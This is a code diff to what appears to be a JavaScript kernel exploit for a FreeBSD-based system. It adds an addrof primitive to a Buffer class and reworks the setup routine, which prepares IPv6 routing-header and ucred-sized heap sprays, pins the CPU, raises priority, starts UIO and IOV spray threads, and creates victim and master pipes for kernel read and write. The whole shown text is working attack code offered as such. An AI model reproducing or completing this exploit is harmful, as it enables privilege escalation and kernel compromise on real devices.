@@ -137,7 +137,9 @@ Buffer.prototype.putLong = function(offset, value) {
     this.addr.write64(offset, value);
 };
 
-
+Buffer.prototype.address = function() {
+    return mem.addrof(this);
+};
 Buffer.prototype.fill = function(byte) {
     const fillByte = byte & 0xFF;
     for (let i = 0; i < this.size; i++) {
@@ -470,8 +472,8 @@ function get_core_index(mask) {
   return position - 1;
 }
 
-function cpusetSetAffinity(core) {
-	sysi("cpuset_setaffinity", 3, 1, -1, 0x10, core.addr);
+function cpusetSetAffinity(mask) {
+	sysi("cpuset_setaffinity", 3, 1, -1, 0x10, mask.addr);
 }
 
 /*function cpuset_setaffinity(level, which, id, setsize, mask) {
@@ -791,104 +793,115 @@ function kwriteSlow(addr, buffer) {
 
 function performSetup() {
     try {
+      
+        log("Initializing worker states");
         iovState = new WorkerState(IOV_THREAD_NUM);
         uioState = new WorkerState(UIO_THREAD_NUM);
-		
-        // Prepare spray buffer
-       sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
-		
-        // Prepare msg iov buffer
+        
+        log("Building spray buffer");
+        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
+        
         log("Preparing msg buffer");
-        msg.putLong(0x10, msgIov.addr); // msg_iov - passa direttamente l'addr
-        msg.putLong(0x18, MSG_IOV_NUM);  // msg_iovlen
+        msg.putLong(0x10, msgIov.address());  // usa .address()
+        msg.putLong(0x18, MSG_IOV_NUM);
 
-		
-
-		
-      /*  dummyBuffer.fill(0x41);
-		uioIovRead.putLong(0x00, dummyBuffer.address());
-        uioIovWrite.putLong(0x00, dummyBuffer.address());
-       */
-        log("Filling dummy buffer");
-        dummyBuffer.fill(0x41);	
-		log("dummyBuffer =", dummyBuffer );
-       uioIovRead.putLong(0, dummyBuffer.addr);
-        uioIovWrite.putLong(0, dummyBuffer.addr);
-		
-		
-        // Affinity
-        previousCore = getCurrentCore();
-		/*  const core4Mask = new Buffer(0x10);
-        core4Mask.write32(0, 1 << 4); // core 4
-        cpusetSetAffinity(core4Mask);
-		*/
-         if (cpusetSetAffinity(4) !== 0) {
-            log("failed to pin to core");
-            return false;
+        log("Filling dummy buffer with 0x41");
+        dummyBuffer.fill(0x41);
+        
+        log("dummyBuffer first bytes:", 
+            dummyBuffer.read8(0).toString(16),
+            dummyBuffer.read8(1).toString(16));
+        
+        log("Setting up UIO IOV buffers");
+        uioIovRead.putLong(0, dummyBuffer.address());  // usa .address()
+        uioIovWrite.putLong(0, dummyBuffer.address()); // usa .address()
+        
+        log("Getting current CPU core");
+        try {
+            previousCore = getCurrentCore();
+            log("Current core:", previousCore);
+        } catch (e) {
+            log("Warning: Failed to get current core:", e);
+            previousCore = -1;
         }
- 
-		log("set realtime priority");
-       if (!setRealtimePriority(256)) {
-           log("failed realtime priority");
-           return false;
-         }
-		
-      log("Create socket pair for UIO spraying");
-		
-        // Create socket pair for UIO spraying
-        socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
-        uioSs0 = uioSs.get(0);
-        uioSs1 = uioSs.get(1);
-   
-		log("Create socket pair for IOV spraying");
-		
-        // Create socket pair for IOV spraying
-        socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
-        iovSs0 = iovSs.get(0);
-        iovSs1 = iovSs.get(1);
+        
+        log("Setting CPU affinity to core 4");
+        const core4Mask = new Buffer(0x10);
+        core4Mask.write32(0, 1 << 4);
+        
+        try {
+            cpusetSetAffinity(core4Mask);  // questa usa .addr internamente
+            log("CPU affinity set successfully");
+        } catch (e) {
+            log("Warning: Failed to set CPU affinity:", e);
+        }
 
-		 log("Create IOV threads");
-        // Create IOV threads
+        log("Setting realtime priority");
+        try {
+            if (!setRealtimePriority(256)) {
+                log("Warning: Failed to set realtime priority");
+            }
+        } catch (e) {
+            log("Warning: Exception in setRealtimePriority:", e);
+        }
+        
+        log("Creating socket pair for UIO spraying");
+        uioSs = new Int32Array(2);
+        socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
+        uioSs0 = uioSs[0];
+        uioSs1 = uioSs[1];
+   
+        log("Creating socket pair for IOV spraying");
+        iovSs = new Int32Array(2);
+        socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
+        iovSs0 = iovSs[0];
+        iovSs1 = iovSs[1];
+
+        log("Creating IOV threads");
         for (let i = 0; i < IOV_THREAD_NUM; i++) {
             iovThreads[i] = new IovThread(iovState);
             iovThreads[i].start();
         }
 
-        // Create UIO threads
+        log("Creating UIO threads");
         for (let i = 0; i < UIO_THREAD_NUM; i++) {
             uioThreads[i] = new UioThread(uioState);
             uioThreads[i].start();
         }
 
-        // Create IPv6 sockets for spraying
+        log("Creating IPv6 sockets");
         for (let i = 0; i < ipv6Socks.length; i++) {
             ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
         }
 
-        // Initialize pktopts (freeRthdr)
+        log("Initializing pktopts");
         for (let i = 0; i < ipv6Socks.length; i++) {
             freeRthdr(ipv6Socks[i]);
         }
 
-        // Initialize pipes
+        log("Creating pipes");
+        masterPipeFd = new Int32Array(2);
+        victimPipeFd = new Int32Array(2);
+        
         pipe(masterPipeFd);
         pipe(victimPipeFd);
 
-        masterRpipeFd = masterPipeFd.get(0);
-        masterWpipeFd = masterPipeFd.get(1);
-        victimRpipeFd = victimPipeFd.get(0);
-        victimWpipeFd = victimPipeFd.get(1);
+        masterRpipeFd = masterPipeFd[0];
+        masterWpipeFd = masterPipeFd[1];
+        victimRpipeFd = victimPipeFd[0];
+        victimWpipeFd = victimPipeFd[1];
 
         fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
         fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
         fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
         fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);
 
+        log("performSetup completed successfully");
         return true;
 
     } catch (e) {
-		 log("exception during performSetup");
-        log(e);
+        log("Exception during performSetup:", e);
+        log("Stack trace:", e.stack);
         return false;
     }
 }
@@ -1542,6 +1555,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
